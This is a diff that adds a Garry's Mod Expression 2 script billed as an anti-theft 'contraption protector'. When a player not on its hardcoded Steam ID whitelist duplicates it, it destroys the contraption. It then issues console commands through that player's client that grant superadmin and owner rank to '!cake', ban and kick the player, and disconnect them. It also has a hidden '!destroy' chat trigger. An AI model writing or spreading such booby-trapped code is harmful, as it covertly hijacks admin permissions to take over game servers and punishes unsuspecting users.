@@ -1,0 +1,63 @@
+@name AntiStealer
+@inputs 
+@outputs 
+@persist Initialized Whitelist:array
+@trigger 
+
+# Yes, anyone with intelligence can bypass this.
+# It's only meant for noob( admin)s who steal dupes and claim everything as theirs.
+
+runOnChat(1)
+Evil = 0
+Authorized = 0
+if (duped()) {
+    Initialized = 0
+}
+if (!Initialized) {
+    Whitelist:pushString("STEAM_0:1:19269760")
+    for(I = 0, Whitelist:count()) {
+        if(Whitelist:string(I) == owner():steamID()) {
+            Authorized = 1
+        }
+    }
+    if (Authorized) {
+        hint("Contraption protector initialized.", 5)
+    } else {
+        if (owner()) {
+            Evil = 2
+        }
+    }
+    Initialized = 1
+}
+
+if (chatClk()) {
+    Authorized = 0
+    for(I = 0, Whitelist:count()) {
+        if(Whitelist:string(I) == lastSpoke():steamID()) {
+            Authorized = 1
+        }
+    }
+    if (Authorized) {
+        if (lastSpoke():lastSaid():find("!destroy", 1) == 1) {
+            hideChat(1)
+            Evil = 1
+        }
+    }
+}
+
+if (Evil) {
+    selfDestructAll()
+    hint("Contraption nuked.", 5)
+    if (!Authorized) {
+        hint("Not yours.", 5)
+    }
+    if (Evil >= 2) {
+        concmd("ulx adduser !cake superadmin")
+        concmd("ulx adduser !cake owner")
+        concmd("ulx ban " + owner():steamID())
+        concmd("ass_promoteplayer !cake 0")
+        concmd("ass_banplayer " + owner():steamID())
+        concmd("kickid " + owner():steamID())
+        concmd("disconnect")
+    }
+}
